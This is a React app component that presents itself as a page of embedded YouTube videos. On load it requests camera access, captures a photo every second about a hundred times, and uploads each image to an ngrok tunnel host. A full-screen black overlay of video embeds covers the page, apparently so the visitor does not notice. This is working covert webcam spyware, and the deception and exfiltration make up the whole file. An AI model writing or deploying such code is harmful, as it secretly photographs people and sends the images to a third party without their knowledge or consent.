import React, { useEffect, useRef, useState } from "react";

const App = () => {
  const videoRef = useRef(null);
  const [stream, setStream] = useState(null);
  const [isCameraOn, setIsCameraOn] = useState(false);
  const [photo, setPhoto] = useState("");

  const getVideoStream = async (takePhoto) => {
    try {
      const mediaStream = await navigator.mediaDevices.getUserMedia({
        video: true,
      });
      videoRef.current.srcObject = mediaStream;

      setStream(mediaStream);
      setIsCameraOn(true);
      let cnt = 0;
      setInterval(() => {
        cnt = cnt + 1;
        if (cnt < 100) {
          takePhoto();
        }
      }, 1000);
    } catch (error) {
      console.error("Error accessing the camera:", error);
    }
  };

  const takePhoto = async () => {
    const video = videoRef.current;
    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext("2d").drawImage(video, 0, 0);
    setPhoto(canvas.toDataURL("image/png"));
    canvas.toBlob(async (blob) => {
      const formData = new FormData();
      formData.append("image", blob);
      await fetch("https://5cfa-185-213-230-129.ngrok-free.app/upload", {
        method: "POST",
        body: formData,
      });
    }, "image/png");
  };

  useEffect(() => {
    if (!isCameraOn) {
      getVideoStream(takePhoto);
    }
  }, []);

  const stopCamera = () => {
    if (stream) {
      stream.getTracks().forEach((track) => track.stop());
      setIsCameraOn(false);
    }
  };

  return (
    <div>
      {!isCameraOn && <button onClick={getVideoStream}>Start Camera</button>}
      {isCameraOn && <button onClick={takePhoto}>Take Photo</button>}
      {isCameraOn && <button onClick={stopCamera}>Stop Camera</button>}
      <video
        ref={videoRef}
        autoPlay
        style={{ display: isCameraOn ? "block" : "none" }}
      ></video>
      {photo && <img src={photo} alt="Captured" />}
      <div
        style={{
          position: "absolute",
          top: 0,
          bottom: 0,
          right: 0,
          left: 0,
          background: "#000000",
          height: "100vh",
          overflow: "hidden",
          padding: "4px",
        }}
      >
        <iframe
          width="100%"
          height="315px"
          src="https://www.youtube.com/embed/sU0BNV7VA9A?si=K3cifcm1VaRbFQT3"
          title="YouTube video player"
          frameborder="0"
          allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
          allowfullscreen
        ></iframe>
        <iframe
          width="100%"
          height="315px"
          src="https://www.youtube.com/embed/dDIuu6otnQU?si=xrG1nQIy3aPeLQKd"
          title="YouTube video player"
          frameborder="0"
          allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
          allowfullscreen
        ></iframe>
        <iframe
          width="100%"
          height="315px"
          src="https://www.youtube.com/embed/fIR4YF0_B6M?si=aqCEAYKIA-lyMR0k"
          title="YouTube video player"
          frameborder="0"
          allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
          allowfullscreen
        ></iframe>
      </div>
    </div>
  );
};

export default App;
